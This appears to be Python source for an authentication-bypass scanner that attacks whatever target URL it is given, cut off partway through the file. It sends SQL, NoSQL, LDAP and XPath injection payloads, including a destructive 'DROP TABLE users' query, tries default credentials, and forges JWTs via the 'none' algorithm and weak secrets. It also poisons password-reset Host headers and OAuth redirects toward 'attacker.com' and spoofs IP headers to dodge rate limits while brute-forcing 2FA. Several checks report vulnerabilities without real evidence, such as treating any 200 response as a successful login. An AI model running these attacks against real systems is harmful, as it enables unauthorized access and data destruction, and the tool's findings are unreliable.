"""
Advanced Authentication Bypass Module
Comprehensive authentication testing including credential attacks, JWT exploits, OAuth flaws, and session manipulation
"""

import requests
import base64
import json
import hmac
import hashlib
import time
import itertools
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime, timedelta
import re


class AdvancedAuthBypass:
    """Advanced authentication bypass and exploitation techniques"""

    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.parsed_url = urlparse(target_url)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        self.vulnerabilities = []

        # Common credentials for testing
        self.common_credentials = self._load_common_credentials()

        # JWT secrets for testing
        self.common_jwt_secrets = [
            "secret",
            "Secret",
            "SECRET",
            "password",
            "123456",
            "admin",
            "jwt_secret",
            "your-256-bit-secret",
            "secretkey",
            "change-me",
        ]

    def _load_common_credentials(self) -> List[Tuple[str, str]]:
        """Load common username/password combinations"""
        return [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", "admin123"),
            ("administrator", "administrator"),
            ("root", "root"),
            ("root", "toor"),
            ("admin", ""),
            ("", ""),
            ("test", "test"),
            ("user", "user"),
            ("guest", "guest"),
        ]

    def run_all_tests(self) -> Dict[str, Any]:
        """Execute all advanced authentication bypass tests"""
        print("[+] Starting advanced authentication testing...")

        self.test_sql_injection_auth_bypass()
        self.test_jwt_vulnerabilities()
        self.test_password_reset_poisoning()
        self.test_oauth_flaws()
        self.test_session_prediction()
        self.test_2fa_bypass()
        self.test_rate_limit_bypass()
        self.test_default_credentials()
        self.test_nosql_injection_auth()
        self.test_ldap_injection_auth()
        self.test_xml_injection_auth()
        self.test_authentication_logic_flaws()

        return {
            "timestamp": datetime.now().isoformat(),
            "total_findings": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities,
        }

    def test_sql_injection_auth_bypass(self):
        """Test SQL injection authentication bypass"""
        print("[*] Testing SQL injection authentication bypass...")

        # Find login endpoints
        login_endpoints = self._discover_login_endpoints()

        # Advanced SQL injection payloads
        sql_bypass_payloads = [
            # Classic bypass
            ("admin' OR '1'='1'--", "anything"),
            ("admin' OR 1=1--", "anything"),
            ("' OR '1'='1'--", "' OR '1'='1'--"),
            # Comment-based
            ("admin'--", ""),
            ("admin' #", ""),
            ("admin'/*", ""),
            # UNION-based
            ("' UNION SELECT NULL, 'admin', 'password' FROM dual--", "password"),
            # Boolean-based
            ("admin' AND '1'='1", "admin' AND '1'='1"),
            # Time-based blind
            ("admin' AND SLEEP(5)--", "anything"),
            # Encoding bypass
            ("admin%27 OR %271%27=%271%27--", "anything"),
            ("admin' OR '1'='1'--", "anything"),
            # Multi-line
            ("admin'\nOR '1'='1'--", "anything"),
            # Stacked queries
            ("admin'; DROP TABLE users--", "anything"),
        ]

        for endpoint in login_endpoints:
            for username, password in sql_bypass_payloads:
                # Try POST
                response = self._attempt_login(
                    endpoint, username, password, method="POST"
                )

                if self._check_login_success(response):
                    evidence = {
                        "endpoint": endpoint,
                        "method": "POST",
                        "username_payload": username,
                        "password_payload": password,
                        "response_status": response.status_code,
                        "cookies_received": dict(response.cookies),
                        "bypass_confirmed": True,
                        "request": self._build_request_string(
                            "POST",
                            endpoint,
                            data={"username": username, "password": password},
                        ),
                    }

                    self.add_vulnerability(
                        title="SQL Injection Authentication Bypass",
                        description=f"Login form at {endpoint} is vulnerable to SQL injection authentication bypass. Attacker can gain unauthorized access without valid credentials.",
                        severity="Critical",
                        remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL queries. Implement proper input validation and use ORM frameworks.",
                        category="Authentication",
                        affected_url=endpoint,
                        evidence=evidence,
                    )
                    return  # Found one, that's enough

    def test_jwt_vulnerabilities(self):
        """Test JWT token vulnerabilities comprehensively"""
        print("[*] Testing JWT vulnerabilities...")

        # Try to find JWT tokens
        response = self._safe_request("GET", self.target_url)
        if not response:
            return

        jwt_token = self._extract_jwt_token(response)

        if not jwt_token:
            print("[-] No JWT token found")
            return

        print(f"[+] JWT token found: {jwt_token[:50]}...")

        # Test 1: Algorithm confusion (none algorithm)
        self._test_jwt_none_algorithm(jwt_token)

        # Test 2: Algorithm confusion (HS256 to RS256)
        self._test_jwt_algorithm_confusion(jwt_token)

        # Test 3: Weak secret brute force
        self._test_jwt_weak_secret(jwt_token)

        # Test 4: Key injection
        self._test_jwt_key_injection(jwt_token)

        # Test 5: JWT claim manipulation
        self._test_jwt_claim_manipulation(jwt_token)

    def _test_jwt_none_algorithm(self, token: str):
        """Test JWT none algorithm vulnerability"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return

            # Decode header and payload
            header = self._jwt_decode(parts[0])
            payload = self._jwt_decode(parts[1])

            if not header or not payload:
                return

            # Modify algorithm to 'none'
            header["alg"] = "none"

            # Modify payload to escalate privileges
            if "role" in payload:
                payload["role"] = "admin"
            if "admin" in payload:
                payload["admin"] = True
            if "is_admin" in payload:
                payload["is_admin"] = True

            # Create new token with no signature
            new_header = (
                base64.urlsafe_b64encode(json.dumps(header).encode())
                .decode()
                .rstrip("=")
            )

            new_payload = (
                base64.urlsafe_b64encode(json.dumps(payload).encode())
                .decode()
                .rstrip("=")
            )

            # Token with empty signature
            modified_token = f"{new_header}.{new_payload}."

            # Test the token
            test_response = self._safe_request(
                "GET",
                self.target_url,
                headers={"Authorization": f"Bearer {modified_token}"},
            )

            if test_response and test_response.status_code == 200:
                evidence = {
                    "original_token": token[:50] + "...",
                    "modified_token": modified_token[:50] + "...",
                    "original_algorithm": header.get("alg", "unknown"),
                    "modified_algorithm": "none",
                    "modified_claims": payload,
                    "server_accepted": True,
                    "vulnerability_type": "JWT None Algorithm Bypass",
                }

                self.add_vulnerability(
                    title="JWT None Algorithm Vulnerability",
                    description="Server accepts JWT tokens with 'none' algorithm, allowing complete authentication bypass and privilege escalation.",
                    severity="Critical",
                    remediation="Explicitly reject tokens with 'none' algorithm. Whitelist allowed algorithms (RS256, HS256). Never use 'none' in production.",
                    category="Authentication",
                    affected_url=self.target_url,
                    evidence=evidence,
                )

        except Exception as e:
            print(f"[-] JWT none algorithm test error: {str(e)}")

    def _test_jwt_weak_secret(self, token: str):
        """Test JWT for weak secret keys"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return

            header = self._jwt_decode(parts[0])

            # Only test HS256 tokens
            if header.get("alg") != "HS256":
                return

            print("[*] Testing JWT weak secret...")

            # Try to crack with common secrets
            for secret in self.common_jwt_secrets[:5]:  # Test first 5 only
                try:
                    # Try to create a signature with this secret
                    message = f"{parts[0]}.{parts[1]}"
                    signature = (
                        base64.urlsafe_b64encode(
                            hmac.new(
                                secret.encode(), message.encode(), hashlib.sha256
                            ).digest()
                        )
                        .decode()
                        .rstrip("=")
                    )

                    # Compare signatures
                    if signature == parts[2]:
                        evidence = {
                            "token": token[:50] + "...",
                            "algorithm": "HS256",
                            "cracked_secret": secret,
                            "vulnerability": "Weak JWT secret allows token forgery",
                        }

                        self.add_vulnerability(
                            title="JWT Weak Secret Key",
                            description=f"JWT token uses weak secret key '{secret}'. Attacker can forge arbitrary tokens and impersonate any user including administrators.",
                            severity="Critical",
                            remediation="Use cryptographically strong random secrets (minimum 256 bits). Rotate secrets regularly. Consider using asymmetric algorithms (RS256).",
                            category="Authentication",
                            affected_url=self.target_url,
                            evidence=evidence,
                        )
                        return

                except Exception:
                    continue

        except Exception as e:
            print(f"[-] JWT weak secret test error: {str(e)}")

    def _test_jwt_claim_manipulation(self, token: str):
        """Test JWT claim manipulation"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return

            payload = self._jwt_decode(parts[1])
            if not payload:
                return

            # Try to manipulate claims
            modified_payload = payload.copy()

            # Privilege escalation attempts
            privilege_fields = [
                "role",
                "admin",
                "is_admin",
                "privileges",
                "permission",
                "level",
            ]

            for field in privilege_fields:
                if field in modified_payload:
                    # Try to escalate
                    if field == "role":
                        modified_payload[field] = "admin"
                    else:
                        modified_payload[field] = True

            # User ID manipulation
            if (
                "user_id" in modified_payload
                or "id" in modified_payload
                or "sub" in modified_payload
            ):
                evidence = {
                    "original_claims": payload,
                    "vulnerability": "JWT claims can be manipulated if signature verification is weak",
                    "potential_attacks": [
                        "Privilege escalation by changing role/admin flags",
                        "Account takeover by changing user_id",
                        "Bypassing payment by changing subscription status",
                    ],
                }

                self.add_vulnerability(
                    title="JWT Claims Manipulation Risk",
                    description="JWT token contains sensitive claims that if signature verification fails, can be manipulated for privilege escalation or account takeover.",
                    severity="High",
                    remediation="Never trust client-side claims without signature verification. Validate all claims server-side. Use minimal claims in JWT.",
                    category="Authentication",
                    affected_url=self.target_url,
                    evidence=evidence,
                )

        except Exception as e:
            print(f"[-] JWT claim manipulation test error: {str(e)}")

    def test_password_reset_poisoning(self):
        """Test password reset token poisoning and manipulation"""
        print("[*] Testing password reset vulnerabilities...")

        reset_endpoints = [
            "/password/reset",
            "/forgot-password",
            "/reset-password",
            "/account/reset",
            "/auth/reset",
        ]

        for endpoint in reset_endpoints:
            url = urljoin(self.base_url, endpoint)
            response = self._safe_request("GET", url)

            if response and response.status_code == 200:
                # Test 1: Host header poisoning
                self._test_host_header_poisoning(url)

                # Test 2: Token predictability
                self._test_reset_token_predictability(url)

                # Test 3: Token reuse
                self._test_reset_token_reuse(url)

                break

    def _test_host_header_poisoning(self, reset_url: str):
        """Test for host header injection in password reset"""
        malicious_host = "attacker.com"

        headers = {
            "Host": malicious_host,
            "X-Forwarded-Host": malicious_host,
            "X-Forwarded-Server": malicious_host,
            "X-Host": malicious_host,
        }

        test_data = {"email": "test@example.com"}

        for header_name, header_value in headers.items():
            response = self._safe_request(
                "POST", reset_url, data=test_data, headers={header_name: header_value}
            )

            if response and response.status_code in [200, 302]:
                evidence = {
                    "endpoint": reset_url,
                    "injected_header": header_name,
                    "malicious_host": malicious_host,
                    "vulnerability": "Host header injection in password reset",
                    "impact": "Attacker can receive password reset tokens by poisoning the reset link",
                }

                self.add_vulnerability(
                    title="Password Reset Host Header Injection",
                    description=f"Password reset endpoint accepts arbitrary host headers. Attacker can poison password reset links to redirect tokens to attacker-controlled domain.",
                    severity="Critical",
                    remediation="Validate and whitelist Host header. Use application-configured base URL for all password reset links. Ignore user-supplied host headers.",
                    category="Authentication",
                    affected_url=reset_url,
                    evidence=evidence,
                )
                return

    def test_oauth_flaws(self):
        """Test OAuth implementation vulnerabilities"""
        print("[*] Testing OAuth vulnerabilities...")

        # Look for OAuth endpoints
        oauth_patterns = [
            "/oauth/authorize",
            "/oauth/callback",
            "/auth/oauth",
            "/login/oauth",
            "/api/oauth",
        ]

        for pattern in oauth_patterns:
            url = urljoin(self.base_url, pattern)
            response = self._safe_request("GET", url)

            if response and response.status_code in [200, 302]:
                # Test for various OAuth flaws
                self._test_oauth_redirect_uri_manipulation(url)
                self._test_oauth_csrf(url)
                self._test_oauth_state_parameter(url)
                break

    def _test_oauth_redirect_uri_manipulation(self, oauth_url: str):
        """Test redirect_uri manipulation in OAuth"""

        # Try to manipulate redirect_uri
        malicious_redirects = [
            "https://attacker.com",
            "https://attacker.com@legitimate.com",
            "https://legitimate.com.attacker.com",
            "https://legitimate.com/callback?redirect=https://attacker.com",
        ]

        for redirect in malicious_redirects:
            params = {
                "client_id": "test",
                "redirect_uri": redirect,
                "response_type": "code",
                "scope": "openid profile email",
            }

            test_url = f"{oauth_url}?{urlencode(params)}"
            response = self._safe_request("GET", test_url)

            if response and (
                response.status_code in [200, 302]
                and redirect in response.headers.get("Location", "")
            ):
                evidence = {
                    "endpoint": oauth_url,
                    "malicious_redirect": redirect,
                    "accepted": True,
                    "vulnerability": "OAuth redirect_uri validation bypass",
                }

                self.add_vulnerability(
                    title="OAuth Redirect URI Manipulation",
                    description="OAuth implementation accepts arbitrary redirect URIs, allowing authorization code/token theft.",
                    severity="Critical",
                    remediation="Implement strict redirect_uri validation. Use exact matching or validated whitelist. Never use substring matching.",
                    category="Authentication",
                    affected_url=oauth_url,
                    evidence=evidence,
                )
                return

    def test_session_prediction(self):
        """Test session token predictability"""
        print("[*] Testing session token predictability...")

        # Generate multiple sessions
        sessions = []
        for i in range(5):
            response = self._safe_request("GET", self.target_url)
            if response and response.cookies:
                for cookie_name, cookie_value in response.cookies.items():
                    if (
                        "session" in cookie_name.lower()
                        or "sess" in cookie_name.lower()
                    ):
                        sessions.append(
                            {
                                "cookie_name": cookie_name,
                                "value": cookie_value,
                                "timestamp": time.time(),
                            }
                        )
            time.sleep(0.5)

        if len(sessions) >= 3:
            # Analyze patterns
            values = [s["value"] for s in sessions]

            # Check for sequential patterns
            if self._check_sequential_pattern(values):
                evidence = {
                    "sample_sessions": values,
                    "pattern": "Sequential/Incremental",
                    "vulnerability": "Session tokens follow predictable pattern",
                }

                self.add_vulnerability(
                    title="Predictable Session Tokens",
                    description="Session tokens follow a predictable sequential or incremental pattern. Attacker can predict valid session IDs and hijack user sessions.",
                    severity="Critical",
                    remediation="Use cryptographically secure random number generator (CSPRNG) for session token generation. Ensure minimum 128 bits of entropy.",
                    category="Session Management",
                    affected_url=self.target_url,
                    evidence=evidence,
                )

    def test_2fa_bypass(self):
        """Test 2FA bypass techniques"""
        print("[*] Testing 2FA bypass methods...")

        # Look for 2FA/MFA endpoints
        mfa_endpoints = [
            "/2fa/verify",
            "/mfa/verify",
            "/verify-code",
            "/totp/verify",
            "/authenticate/2fa",
        ]

        for endpoint in mfa_endpoints:
            url = urljoin(self.base_url, endpoint)

            # Test 1: Missing rate limiting
            self._test_2fa_brute_force(url)

            # Test 2: Response manipulation
            self._test_2fa_response_manipulation(url)

            # Test 3: Code reuse
            self._test_2fa_code_reuse(url)

    def _test_2fa_brute_force(self, mfa_url: str):
        """Test 2FA brute force without rate limiting"""

        # Try multiple codes quickly
        attempts = 0
        for code in range(100000, 100010):  # Try 10 codes
            response = self._safe_request("POST", mfa_url, data={"code": str(code)})
            attempts += 1

            if attempts >= 10:
                # If we made 10 attempts without being blocked
                evidence = {
                    "endpoint": mfa_url,
                    "attempts_made": attempts,
                    "rate_limiting": "Not detected",
                    "vulnerability": "2FA codes can be brute forced",
                }

                self.add_vulnerability(
                    title="2FA Brute Force - No Rate Limiting",
                    description="2FA verification endpoint lacks rate limiting, allowing attackers to brute force 6-digit codes (1 million possibilities).",
                    severity="High",
                    remediation="Implement strict rate limiting (3-5 attempts). Add account lockout. Implement CAPTCHA after failed attempts. Use longer codes or time-based expiry.",
                    category="Authentication",
                    affected_url=mfa_url,
                    evidence=evidence,
                )
                return

    def test_rate_limit_bypass(self):
        """Test rate limit bypass techniques"""
        print("[*] Testing rate limit bypass...")

        login_endpoints = self._discover_login_endpoints()

        for endpoint in login_endpoints:
            # Test various bypass techniques
            bypass_methods = [
                ("X-Forwarded-For", "1.2.3.4"),
                ("X-Real-IP", "1.2.3.4"),
                ("X-Originating-IP", "1.2.3.4"),
                ("X-Remote-IP", "1.2.3.4"),
                ("X-Client-IP", "1.2.3.4"),
            ]

            for header_name, header_value in bypass_methods:
                # Make multiple requests with spoofed IP
                success_count = 0
                for i in range(10):
                    response = self._safe_request(
                        "POST",
                        endpoint,
                        data={"username": "test", "password": f"pass{i}"},
                        headers={
                            header_name: f"{header_value[:-1]}{i}"
                        },  # Change last digit
                    )

                    if response and response.status_code != 429:
                        success_count += 1

                if success_count >= 8:  # If most requests succeeded
                    evidence = {
                        "endpoint": endpoint,
                        "bypass_header": header_name,
                        "successful_requests": success_count,
                        "total_attempts": 10,
                        "vulnerability": "Rate limiting bypassed via header manipulation",
                    }

                    self.add_vulnerability(
                        title="Rate Limit Bypass via Header Manipulation",
                        description=f"Rate limiting can be bypassed by manipulating {header_name} header, allowing unlimited authentication attempts.",
                        severity="High",
                        remediation="Implement rate limiting at application level, not just by IP. Use session-based or account-based rate limiting. Validate and sanitize proxy headers.",
                        category="Authentication",
                        affected_url=endpoint,
                        evidence=evidence,
                    )
                    return

    def test_default_credentials(self):
        """Test for default credentials"""
        print("[*] Testing default credentials...")

        login_endpoints = self._discover_login_endpoints()

        for endpoint in login_endpoints:
            for username, password in self.common_credentials[:5]:  # Test top 5
                response = self._attempt_login(endpoint, username, password)

                if self._check_login_success(response):
                    evidence = {
                        "endpoint": endpoint,
                        "username": username,
                        "password": password,
                        "login_successful": True,
                    }

                    self.add_vulnerability(
                        title="Default/Weak Credentials",
                        description=f"Application accepts default credentials: {username}/{password}. Attacker can gain unauthorized access.",
                        severity="Critical",
                        remediation="Force password change on first login. Implement strong password policy. Disable default accounts.",
                        category="Authentication",
                        affected_url=endpoint,
                        evidence=evidence,
                    )
                    return

    def test_nosql_injection_auth(self):
        """Test NoSQL injection in authentication"""
        print("[*] Testing NoSQL injection authentication bypass...")

        login_endpoints = self._discover_login_endpoints()

        nosql_payloads = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": "admin", "password": {"$regex": ".*"}},
            {
                "username": {"$in": ["admin", "administrator"]},
                "password": {"$exists": True},
            },
        ]

        for endpoint in login_endpoints:
            for payload in nosql_payloads:
                # Try as JSON
                response = self._safe_request(
                    "POST",
                    endpoint,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                )

                if self._check_login_success(response):
                    evidence = {
                        "endpoint": endpoint,
                        "payload": payload,
                        "bypass_successful": True,
                        "vulnerability_type": "NoSQL Injection Authentication Bypass",
                    }

                    self.add_vulnerability(
                        title="NoSQL Injection Authentication Bypass",
                        description="Login endpoint is vulnerable to NoSQL injection, allowing authentication bypass without valid credentials.",
                        severity="Critical",
                        remediation="Sanitize and validate all inputs. Use parameterized queries. Implement input type checking. Use ORM/ODM libraries.",
                        category="Authentication",
                        affected_url=endpoint,
                        evidence=evidence,
                    )
                    return

    def test_ldap_injection_auth(self):
        """Test LDAP injection in authentication"""
        print("[*] Testing LDAP injection authentication bypass...")

        login_endpoints = self._discover_login_endpoints()

        ldap_payloads = [
            ("admin)(&", "password"),
            ("*)(uid=*", "*)(uid=*"),
            ("admin*)((|userPassword=*)", "anything"),
        ]

        for endpoint in login_endpoints:
            for username, password in ldap_payloads:
                response = self._attempt_login(endpoint, username, password)

                if self._check_login_success(response):
                    evidence = {
                        "endpoint": endpoint,
                        "username_payload": username,
                        "password_payload": password,
                        "bypass_successful": True,
                    }

                    self.add_vulnerability(
                        title="LDAP Injection Authentication Bypass",
                        description="LDAP-based authentication is vulnerable to injection, allowing bypass without valid credentials.",
                        severity="Critical",
                        remediation="Escape LDAP special characters. Use parameterized LDAP queries. Validate inputs against whitelist.",
                        category="Authentication",
                        affected_url=endpoint,
                        evidence=evidence,
                    )
                    return

    def test_xml_injection_auth(self):
        """Test XML/XPath injection in authentication"""
        print("[*] Testing XML injection authentication bypass...")

        login_endpoints = self._discover_login_endpoints()

        xml_payloads = [
            ("admin' or '1'='1", "anything"),
            ("' or 1=1 or ''='", "' or 1=1 or ''='"),
        ]

        for endpoint in login_endpoints:
            for username, password in xml_payloads:
                xml_data = f"""<?xml version="1.0"?>
<auth>
    <username>{username}</username>
    <password>{password}</password>
</auth>"""

                response = self._safe_request(
                    "POST",
                    endpoint,
                    data=xml_data,
                    headers={"Content-Type": "application/xml"},
                )

                if self._check_login_success(response):
                    evidence = {
                        "endpoint": endpoint,
                        "xml_payload": xml_data,
                        "bypass_successful": True,
                    }

                    self.add_vulnerability(
                        title="XML/XPath Injection Authentication Bypass",
                        description="XML-based authentication is vulnerable to injection attacks.",
                        severity="Critical",
                        remediation="Use parameterized XPath queries. Validate and sanitize XML inputs. Use XML schema validation.",
                        category="Authentication",
                        affected_url=endpoint,
                        evidence=evidence,
                    )
                    return

    def test_authentication_logic_flaws(self):
        """Test for authentication logic flaws"""
        print("[*] Testing authentication logic flaws...")

        login_endpoints = self._discover_login_endpoints()

        for endpoint in login_endpoints:
            # Test 1: Direct access to protected resources
            protected_paths = ["/admin", "/dashboard", "/profile", "/account"]

            for path in protected_paths:
                protected_url = urljoin(self.base_url, path)
                response = self._safe_request("GET", protected_url)

                if (
                    response
                    and response.status_code == 200
                    and len(response.text) > 1000
                ):
                    evidence = {
                        "protected_url": protected_url,
                        "accessible_without_auth": True,
                        "response_size": len(response.text),
                    }

                    self.add_vulnerability(
                        title="Missing Authentication on Protected Resource",
                        description=f"Protected resource {path} is accessible without authentication.",
                        severity="High",
                        remediation="Implement proper authentication checks on all protected resources. Use middleware/decorators for consistent auth enforcement.",
                        category="Authentication",
                        affected_url=protected_url,
                        evidence=evidence,
                    )

    # Helper methods
    def _discover_login_endpoints(self) -> List[str]:
        """Discover login endpoints"""
        endpoints = [
            "/login",
            "/signin",
            "/auth/login",
            "/api/login",
            "/user/login",
            "/admin/login",
            "/authenticate",
        ]

        found_endpoints = []
        for path in endpoints:
            url = urljoin(self.base_url, path)
            response = self._safe_request("GET", url)
            if response and response.status_code in [200, 405]:
                found_endpoints.append(url)

        return found_endpoints if found_endpoints else [self.target_url]

    def _attempt_login(
        self, url: str, username: str, password: str, method: str = "POST"
    ) -> Optional[requests.Response]:
        """Attempt login with credentials"""
        data = {"username": username, "password": password}

        if method == "POST":
            return self._safe_request("POST", url, data=data)
        else:
            return self._safe_request("GET", url, params=data)

    def _check_login_success(self, response: Optional[requests.Response]) -> bool:
        """Check if login was successful"""
        if not response:
            return False

        success_indicators = [
            response.status_code in [200, 302, 303],
            "dashboard" in response.text.lower(),
            "welcome" in response.text.lower(),
            "logout" in response.text.lower(),
            len(response.cookies) > 0,
            "success" in response.text.lower(),
            "token" in response.text.lower(),
        ]

        return any(success_indicators)

    def _extract_jwt_token(self, response: requests.Response) -> Optional[str]:
        """Extract JWT token from response"""
        # Check Authorization header
        auth_header = response.headers.get("Authorization", "")
        if "Bearer" in auth_header:
            return auth_header.replace("Bearer ", "").strip()

        # Check cookies
        for cookie_name, cookie_value in response.cookies.items():
            if "jwt" in cookie_name.lower() or "token" in cookie_name.lower():
                return cookie_value

        # Check response body
        try:
            json_data = response.json()
            if "token" in json_data:
                return json_data["token"]
            if "access_token" in json_data:
                return json_data["access_token"]
            if "jwt" in json_data:
                return json_data["jwt"]
        except:
            pass

        # Check HTML for embedded tokens
        import re

        jwt_pattern = r"eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*"
        matches = re.findall(jwt_pattern, response.text)
        if matches:
            return matches[0]

        return None

    def _jwt_decode(self, encoded_str: str) -> Optional[Dict]:
        """Decode JWT segment"""
        try:
            # Add padding if needed
            padding = 4 - (len(encoded_str) % 4)
            if padding != 4:
                encoded_str += "=" * padding

            decoded = base64.urlsafe_b64decode(encoded_str)
            return json.loads(decoded)
        except Exception as e:
            print(f"[-] JWT decode error: {str(e)}")
            return None

    def _test_jwt_algorithm_confusion(self, token: str):
        """Test JWT algorithm confusion (RS256 to HS256)"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return

            header = self._jwt_decode(parts[0])
            payload = self._jwt_decode(parts[1])

            if not header or not payload:
                return

            # Only test if original algorithm is RS256
            if header.get("alg") != "RS256":
                return

            # Change algorithm to HS256
            header["alg"] = "HS256"

            # Modify payload for privilege escalation
            if "role" in payload:
                payload["role"] = "admin"

            # Try to sign with public key as secret
            # This is a simplified test - real attack would need actual public key
            evidence = {
                "vulnerability_type": "Algorithm Confusion (RS256 to HS256)",
                "original_algorithm": "RS256",
                "attack_algorithm": "HS256",
                "risk": "If server uses public key to verify HS256, complete bypass possible",
            }

            self.add_vulnerability(
                title="JWT Algorithm Confusion Vulnerability",
                description="JWT implementation may be vulnerable to algorithm confusion attack (RS256→HS256). If public key is used to verify HMAC signature, authentication can be bypassed.",
                severity="Critical",
                remediation="Explicitly validate algorithm matches expected value. Never use public key for HMAC verification. Use algorithm whitelisting.",
                category="Authentication",
                affected_url=self.target_url,
                evidence=evidence,
            )

        except Exception as e:
            print(f"[-] JWT algorithm confusion test error: {str(e)}")

    def _test_jwt_key_injection(self, token: str):
        """Test JWT key injection vulnerability"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return

            header = self._jwt_decode(parts[0])
            payload = self._jwt_decode(parts[1])

            if not header or not payload:
                return

            # Inject jwk or jku parameter
            header["jwk"] = {
                "kty": "RSA",
                "kid": "attacker-key",
                "use": "sig",
                "n": "attacker_modulus",
                "e": "AQAB",
            }

            evidence = {
                "vulnerability_type": "JWT Key Injection",
                "injected_parameter": "jwk",
                "risk": "Attacker can supply their own key for signature verification",
            }

            self.add_vulnerability(
                title="JWT Key Injection Risk",
                description="JWT header may accept jwk/jku parameters, allowing attackers to supply their own signing keys.",
                severity="High",
                remediation="Disable jwk/jku header parameters. Use pre-configured keys only. Validate key sources.",
                category="Authentication",
                affected_url=self.target_url,
                evidence=evidence,
            )

        except Exception as e:
            print(f"[-] JWT key injection test error: {str(e)}")

    def _test_oauth_csrf(self, oauth_url: str):
        """Test OAuth CSRF protection"""
        # Test if state parameter is properly validated
        params = {
            "client_id": "test",
            "redirect_uri": "https://example.com/callback",
            "response_type": "code",
            "scope": "openid profile",
            # Intentionally omit state parameter
        }

        test_url = f"{oauth_url}?{urlencode(params)}"
        response = self._safe_request("GET", test_url)

        if response and response.status_code in [200, 302]:
            # Check if state is enforced
            if "state" not in response.url:
                evidence = {
                    "endpoint": oauth_url,
                    "missing_parameter": "state",
                    "vulnerability": "OAuth CSRF - state parameter not enforced",
                }

                self.add_vulnerability(
                    title="OAuth CSRF - Missing State Parameter",
                    description="OAuth flow doesn't enforce state parameter, allowing CSRF attacks where attacker can link victim's account to attacker's OAuth account.",
                    severity="High",
                    remediation="Enforce state parameter in all OAuth flows. Generate cryptographically random state values. Validate state on callback.",
                    category="Authentication",
                    affected_url=oauth_url,
                    evidence=evidence,
                )

    def _test_oauth_state_parameter(self, oauth_url: str):
        """Test OAuth state parameter validation"""
        # Make two requests with same state
        state_value = "predictable_state_123"

        params = {
            "client_id": "test",
            "redirect_uri": "https://example.com/callback",
            "response_type": "code",
            "scope": "openid",
            "state": state_value,
        }

        # First request
        response1 = self._safe_request("GET", f"{oauth_url}?{urlencode(params)}")
        time.sleep(1)
        # Second request with same state
        response2 = self._safe_request("GET", f"{oauth_url}?{urlencode(params)}")

        if (
            response1
            and response2
            and response1.status_code == response2.status_code == 200
        ):
            evidence = {
                "endpoint": oauth_url,
                "reused_state": state_value,
                "vulnerability": "State parameter can be reused - not single-use",
            }

            self.add_vulnerability(
                title="OAuth State Reuse Vulnerability",
                description="OAuth state parameter can be reused across multiple requests, weakening CSRF protection.",
                severity="Medium",
                remediation="Implement single-use state tokens. Expire state after first use. Use cryptographically random values.",
                category="Authentication",
                affected_url=oauth_url,
                evidence=evidence,
            )

    def _test_reset_token_predictability(self, reset_url: str):
        """Test password reset token predictability"""
        tokens = []

        # Generate multiple reset tokens
        for i in range(3):
            response = self._safe_request(
                "POST", reset_url, data={"email": f"test{i}@example.com"}
            )

            if response:
                # Try to extract token from response
                token = self._extract_reset_token(response)
                if token:
                    tokens.append(token)
            time.sleep(0.5)

        if len(tokens) >= 2:
            # Check for patterns
            if self._check_sequential_pattern(tokens):
                evidence = {
                    "sample_tokens": tokens,
                    "pattern": "Sequential/Predictable",
                    "vulnerability": "Reset tokens follow predictable pattern",
                }

                self.add_vulnerability(
                    title="Predictable Password Reset Tokens",
                    description="Password reset tokens follow predictable patterns, allowing attackers to guess valid tokens and reset arbitrary accounts.",
                    severity="Critical",
                    remediation="Use cryptographically secure random tokens (minimum 128 bits). Add rate limiting. Implement token expiration (15 minutes max).",
                    category="Authentication",
                    affected_url=reset_url,
                    evidence=evidence,
                )

    def _test_reset_token_reuse(self, reset_url: str):
        """Test if reset tokens can be reused"""
        test_email = "test@example.com"

        # Request token
        response = self._safe_request("POST", reset_url, data={"email": test_email})

        if response:
            token = self._extract_reset_token(response)
            if token:
                # Try to use token twice
                use_url = reset_url.replace("/reset", "/reset/confirm")

                response1 = self._safe_request(
                    "POST", use_url, data={"token": token, "password": "newpass123"}
                )

                response2 = self._safe_request(
                    "POST", use_url, data={"token": token, "password": "anotherpass"}
                )

                if response1 and response2 and response2.status_code == 200:
                    evidence = {
                        "token": token[:20] + "...",
                        "reuse_successful": True,
                        "vulnerability": "Reset token can be reused multiple times",
                    }

                    self.add_vulnerability(
                        title="Password Reset Token Reuse",
                        description="Password reset tokens can be reused multiple times, allowing multiple password changes from single token.",
                        severity="High",
                        remediation="Implement single-use tokens. Invalidate token after first use. Add short expiration time.",
                        category="Authentication",
                        affected_url=reset_url,
                        evidence=evidence,
                    )

    def _test_2fa_response_manipulation(self, mfa_url: str):
        """Test 2FA response manipulation"""
        response = self._safe_request(
            "POST", mfa_url, data={"code": "000000"}  # Wrong code
        )

        if response and response.status_code == 401:
            # Check if response can be manipulated to success
            evidence = {
                "endpoint": mfa_url,
                "vulnerability_type": "Response Manipulation",
                "risk": "If client-side validation only, attacker can manipulate response",
            }

            # This is more of a logical test - actual exploitation would need client-side code analysis
            self.add_vulnerability(
                title="Potential 2FA Response Manipulation",
                description="2FA implementation should be tested for client-side response manipulation. If validation is client-side only, attackers can bypass 2FA.",
                severity="Medium",
                remediation="Perform all 2FA validation server-side. Never trust client-side success indicators. Use secure session state.",
                category="Authentication",
                affected_url=mfa_url,
                evidence=evidence,
            )

    def _test_2fa_code_reuse(self, mfa_url: str):
        """Test if 2FA codes can be reused"""
        # This would require actual valid code which we don't have
        # So this is a logical vulnerability flag
        evidence = {
            "endpoint": mfa_url,
            "test_type": "Code Reuse Check",
            "recommendation": "Verify that 2FA codes are single-use and expire quickly",
        }

        self.add_vulnerability(
            title="2FA Code Reuse Risk Assessment",
            description="2FA implementation should be manually verified to ensure codes are single-use and expire within 30-60 seconds.",
